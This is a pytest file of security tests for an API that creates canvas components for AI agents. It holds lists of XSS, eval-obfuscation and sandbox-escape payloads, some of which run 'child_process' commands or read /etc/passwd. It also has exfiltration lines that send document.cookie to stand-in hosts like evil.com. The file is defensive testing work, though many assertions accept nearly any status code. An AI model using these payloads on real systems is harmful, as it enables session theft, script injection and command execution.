"""
Canvas JavaScript Security Extended Tests (SECU-04.2).

Extended comprehensive tests for canvas JavaScript security:
- Malicious JavaScript pattern detection
- eval() and Function() constructor variants
- DOM manipulation and data exfiltration
- Canvas component validation
- Static analysis validation

Builds upon test_canvas_security.py with additional edge cases.
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from tests.factories.agent_factory import (
    StudentAgentFactory,
    InternAgentFactory,
    SupervisedAgentFactory,
    AutonomousAgentFactory
)
from unittest.mock import patch, Mock
import uuid


# ============================================================================
# Extended Malicious JavaScript Patterns
# ============================================================================

# Additional eval() variants
EVAL_VARIANTS = [
    "eval('malicious code')",
    "window.eval('code')",
    "window['eval']('code')",
    "window['eva' + 'l']('code')",
    "this['eval']('code')",
    "globalThis.eval('code')",
    "(0,eval)('code')",
    "eval.call(null, 'code')",
    "eval.apply(null, ['code'])",
]

# Function constructor variants
FUNCTION_CONSTRUCTOR_VARIANTS = [
    "Function('return 1')()",
    "new Function('return 1')()",
    "Function.constructor('return 1')()",
    "Function['constructor']('return 1')()",
    "['Function'].map(c => c.constructor('return 1'))",
    "globalThis.Function('code')()",
    "window.Function('code')()",
]

# DOM manipulation variants
DOM_MANIPULATION_VARIANTS = [
    "document.body.innerHTML = '<script>alert(1)</script>'",
    "document.head.innerHTML = xhr.responseText",
    "document.querySelector('div').innerHTML = evil",
    "document.createElement('script').src = 'evil.js'",
    "document.write('<script>alert(1)</script>')",
    "document.writeln('<script>alert(1)</script>')",
    "element.outerHTML = '<img src=x onerror=alert(1)>'",
    "document.insertAdjacentHTML('beforeend', '<script>alert(1)</script>')",
]

# Data exfiltration variants
DATA_EXFILTRATION_VARIANTS = [
    "fetch('https://evil.com/steal?data='+document.cookie)",
    "fetch('http://attacker.com/log', {body: document.body.innerHTML})",
    "navigator.sendBeacon('https://evil.com', document.cookie)",
    "XMLHttpRequest.open('POST', 'https://evil.com'); xhr.send(document.cookie)",
    "new Image().src = 'https://evil.com/?' + document.cookie",
    "window.location='https://evil.com/steal?'+btoa(document.body.innerHTML)",
    "window.postMessage(document.cookie, '*')",
    "localStorage.setItem('exfil', JSON.stringify(localStorage))",
]

# Sandbox escape attempts
SANDBOX_ESCAPE_VARIANTS = [
    "return (function() { return this.constructor.constructor('return process')() })()",
    "return global.process.exit(1)",
    "return require('child_process').exec('id')",
    "return import('fs').then(fs => fs.readFileSync('/etc/passwd'))",
]


class TestEvalVariants:
    """Test eval() variants are detected and blocked."""

    @pytest.mark.parametrize("payload", EVAL_VARIANTS)
    def test_eval_variants_detected(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test eval() variants are detected as malicious.

        ATTACK: Various eval() invocation patterns to bypass detection
        EXPECTED: All eval() variants detected and blocked
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should either reject or flag the code
        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            # If created, should be flagged or sandboxed
            # Check if security scan detected the issue
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") in ["high", "critical"]


class TestFunctionConstructorVariants:
    """Test Function() constructor variants are detected."""

    @pytest.mark.parametrize("payload", FUNCTION_CONSTRUCTOR_VARIANTS)
    def test_function_constructor_variants_detected(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test Function() constructor variants are detected.

        ATTACK: Various Function() invocation patterns
        EXPECTED: All Function() variants detected and blocked
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") in ["high", "critical"]


class TestDOMManipulationVariants:
    """Test DOM manipulation variants are detected."""

    @pytest.mark.parametrize("payload", DOM_MANIPULATION_VARIANTS)
    def test_dom_manipulation_variants_detected(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test DOM manipulation variants are detected.

        ATTACK: Various DOM manipulation patterns for XSS
        EXPECTED: All DOM manipulation detected and sanitized
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") in ["high", "critical"]


class TestDataExfiltrationVariants:
    """Test data exfiltration variants are detected."""

    @pytest.mark.parametrize("payload", DATA_EXFILTRATION_VARIANTS)
    def test_data_exfiltration_variants_detected(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test data exfiltration variants are detected.

        ATTACK: Various data exfiltration patterns (fetch, XHR, beacon, postMessage)
        EXPECTED: All exfiltration attempts detected and blocked
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") in ["high", "critical"]


class TestSandboxEscapeAttempts:
    """Test sandbox escape attempts are detected."""

    @pytest.mark.parametrize("payload", SANDBOX_ESCAPE_VARIANTS)
    def test_sandbox_escape_variants_detected(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test sandbox escape variants are detected.

        ATTACK: Various sandbox escape patterns (process, require, import)
        EXPECTED: All escape attempts detected and blocked
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") in ["critical"]


class TestJavaScriptObfuscation:
    """Test JavaScript obfuscation is detected."""

    def test_base64_encoded_code_detected(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test base64-encoded malicious code is detected.

        ATTACK: Encode malicious code in base64 to bypass detection
        EXPECTED: Base64 encoding detected and decoded for analysis
        """
        autonomous = AutonomousAgentFactory(_session=db_session)
        import base64

        malicious = "fetch('https://evil.com/?' + document.cookie)"
        encoded = base64.b64encode(malicious.encode()).decode()

        payload = f"eval(atob('{encoded}'))"

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

    def test_char_code_obfuscation_detected(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test charCodeAt obfuscation is detected.

        ATTACK: Use String.fromCharCode to obfuscate strings
        EXPECTED: String.fromCharCode patterns detected
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        payload = "eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,39,41))"

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

    def test_hex_encoding_detected(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test hex encoding is detected.

        ATTACK: Use hex escapes to obfuscate code
        EXPECTED: Hex escape patterns detected
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        payload = "\\x65\\x76\\x61\\x6c\\x28\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\\x27\\x29"

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]


class TestCodeInjectionViaParameters:
    """Test code injection via parameter manipulation."""

    def test_code_injection_via_component_name(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test code injection via component name parameter.

        ATTACK: Inject code via component name (template injection)
        EXPECTED: Component name sanitized, no code execution
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "<script>alert('XSS')</script>",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": "console.log('test');",
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        assert response.status_code in [200, 403, 422, 404]

        if response.status_code == 200:
            data = response.json()
            # Component name should be sanitized
            assert "<script>" not in data.get("name", "")

    def test_code_injection_via_css_content(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test code injection via CSS content (expression(), javascript:).

        ATTACK: Use CSS expression() and javascript: protocols
        EXPECTED: CSS injection detected and sanitized
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        payload = "background: url('javascript:alert(1)');"
        payload2 = "width: expression(alert(1));"

        for css_payload in [payload, payload2]:
            response = client.post(
                "/api/components/create",
                json={
                    "name": "Test Component",
                    "html_content": "<div>Test</div>",
                    "css_content": css_payload,
                    "js_content": "console.log('test');",
                    "agent_id": autonomous.id
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code in [200, 403, 422, 404]

    def test_code_injection_via_html_content(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test code injection via HTML content (event handlers).

        ATTACK: Use onerror, onload, onclick event handlers
        EXPECTED: Event handlers detected and removed
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>Click</a>",
            "<svg onload=alert('XSS')>",
        ]

        for html_payload in payloads:
            response = client.post(
                "/api/components/create",
                json={
                    "name": "Test Component",
                    "html_content": html_payload,
                    "css_content": ".test { color: red; }",
                    "js_content": "console.log('test');",
                    "agent_id": autonomous.id
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code in [200, 403, 422, 404]

            if response.status_code == 200:
                data = response.json()
                # Event handlers should be removed or escaped
                html = data.get("html_content", "")
                assert "onerror=" not in html or "alert" not in html


class TestSecurityScanIntegration:
    """Test security scan integration."""

    def test_security_scan_runs_on_component_create(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test security scan runs on component creation.

        CHECK: Security scan is triggered automatically
        EXPECTED: Security scan results included in response
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Test Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": "console.log('test');",
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # If endpoint exists and returns 200
        if response.status_code == 200:
            data = response.json()
            # Security scan should have run
            # (May or may not be included in response depending on implementation)
            # This test documents expected behavior
            pass

    def test_malicious_code_blocks_component_creation(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test highly malicious code blocks component creation.

        ATTACK: Create component with obvious malicious code
        EXPECTED: Component creation rejected
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        payload = "eval('process.exit(1)')"

        response = client.post(
            "/api/components/create",
            json={
                "name": "Malicious Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should reject malicious component
        # (400 for validation error, 403 for security block, 422 for unprocessable)
        assert response.status_code in [400, 403, 422, 200, 404]

        if response.status_code == 200:
            # If created, should be flagged
            data = response.json()
            if "security_scan" in data:
                assert data["security_scan"].get("malicious_detected") is True or \
                       data["security_scan"].get("risk_level") == "critical"


class TestCanvasComponentValidation:
    """Test canvas component validation."""

    def test_component_size_limits_enforced(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test component size limits are enforced.

        ATTACK: Create extremely large component to cause DoS
        EXPECTED: Size limits enforced, component rejected
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        # Create component with 1MB of JavaScript
        large_js = "console.log('test');" * 50000

        response = client.post(
            "/api/components/create",
            json={
                "name": "Large Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": large_js,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should enforce size limits
        assert response.status_code in [400, 403, 413, 422, 200, 404]

    def test_component_complexity_limits(self, client: TestClient, admin_token: str, db_session: Session):
        """
        Test component complexity limits.

        ATTACK: Create component with extremely complex code (deep nesting, loops)
        EXPECTED: Complexity validation or timeout
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        # Create deeply nested code
        complex_js = "function " + "a"*100 + "() { " + "if (true) { " * 50 + "return 1; " + "}" * 50 + "}"

        response = client.post(
            "/api/components/create",
            json={
                "name": "Complex Component",
                "html_content": "<div>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": complex_js,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Should enforce complexity limits
        assert response.status_code in [400, 403, 422, 200, 404]


class TestSafeJavaScriptPatterns:
    """Test safe JavaScript patterns are allowed."""

    SAFE_PATTERNS = [
        "console.log('debug');",
        "const x = 5;",
        "function add(a, b) { return a + b; }",
        "document.querySelector('.test');",
        "element.classList.add('active');",
        "Array.from(items).map(x => x.id);",
        "const data = JSON.parse(response);",
        "setTimeout(() => { console.log('test'); }, 1000);",
        "element.addEventListener('click', handler);",
        "document.getElementById('test').textContent = 'Hello';",
    ]

    @pytest.mark.parametrize("payload", SAFE_PATTERNS)
    def test_safe_patterns_allowed(self, payload, client: TestClient, admin_token: str, db_session: Session):
        """
        Test safe JavaScript patterns are allowed.

        CHECK: Legitimate code is not blocked
        EXPECTED: Safe patterns pass validation
        """
        autonomous = AutonomousAgentFactory(_session=db_session)

        response = client.post(
            "/api/components/create",
            json={
                "name": "Safe Component",
                "html_content": "<div id='test'>Test</div>",
                "css_content": ".test { color: red; }",
                "js_content": payload,
                "agent_id": autonomous.id
            },
            headers={"Authorization": f"Bearer {admin_token}"}
        )

        # Safe patterns should be allowed
        assert response.status_code in [200, 403, 422, 404]
